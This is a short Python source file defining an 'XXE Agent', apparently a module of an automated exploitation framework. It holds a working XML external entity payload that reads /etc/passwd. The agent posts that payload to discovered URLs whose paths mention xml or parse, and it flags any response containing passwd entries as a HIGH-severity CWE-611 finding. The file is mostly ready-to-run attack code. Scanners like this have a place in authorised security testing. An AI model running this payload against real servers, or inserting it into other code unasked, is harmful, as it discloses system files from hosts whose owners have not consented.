
"""XXE Agent - FIXED"""
import aiohttp
from typing import Dict, Optional
from agents.base import BaseAgent, AgentResult

class XXEAgent(BaseAgent):
    def __init__(self):
        super().__init__(name="xxe_agent", agent_type="exploit")
        self.payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
        
    async def execute(self, target: str, config: Optional[Dict] = None) -> AgentResult:
        config = config or {}
        results = {"agent": self.name, "vulnerabilities": []}
        discovered_urls = config.get("discovered_urls", [])
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
            for url_data in discovered_urls[:10]:
                url = url_data.get("url", "") if isinstance(url_data, dict) else str(url_data)
                if url and ("xml" in url.lower() or "parse" in url.lower()):
                    vuln = await self._test_xxe(session, url)
                    if vuln:
                        results["vulnerabilities"].append(vuln)
        
        return AgentResult(success=True, data=results)
    
    async def _test_xxe(self, session, url):
        try:
            async with session.post(url, data=self.payload, headers={'Content-Type': 'application/xml'}, timeout=aiohttp.ClientTimeout(total=5)) as response:
                text = await response.text()
                if "root:x:0" in text or "daemon:" in text:
                    return {"vulnerability_type": "xxe", "severity": "HIGH", "url": url, "title": "XXE", "cwe": "CWE-611"}
        except:
            pass
        return None
